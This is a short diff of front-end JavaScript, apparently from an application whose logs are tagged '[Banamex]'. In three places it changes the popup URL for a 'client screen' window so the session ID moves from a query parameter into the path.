@@ -1356,7 +1356,7 @@
                         
                         // Abrir ventana emergente con la pantalla del cliente
                         const clientWindow = window.open(
-                            `/client?sessionId=${sessionId}`,
+                            `/client/${sessionId}`,
                             'ClientScreen',
                             'width=800,height=900,menubar=no,toolbar=no,location=no,status=no,scrollbars=yes,resizable=yes'
                         );
@@ -1472,7 +1472,7 @@
                         console.log('[Banamex] Abriendo ventana del cliente con sessionId:', data.sessionId);
                         
                         const clientWindow = window.open(
-                            `/client?sessionId=${data.sessionId}`,
+                            `/client/${data.sessionId}`,
                             'ClientScreen',
                             'width=800,height=900,menubar=no,toolbar=no,location=no,status=no,scrollbars=yes,resizable=yes'
                         );
@@ -1606,7 +1606,7 @@
                         console.log('[Banamex] Abriendo ventana del cliente con sessionId:', sessionId);
                         
                         const clientWindow = window.open(
-                            `/client?sessionId=${sessionId}`,
+                            `/client/${sessionId}`,
                             'ClientScreen',
                             'width=800,height=900,menubar=no,toolbar=no,location=no,status=no,scrollbars=yes,resizable=yes'
                         );
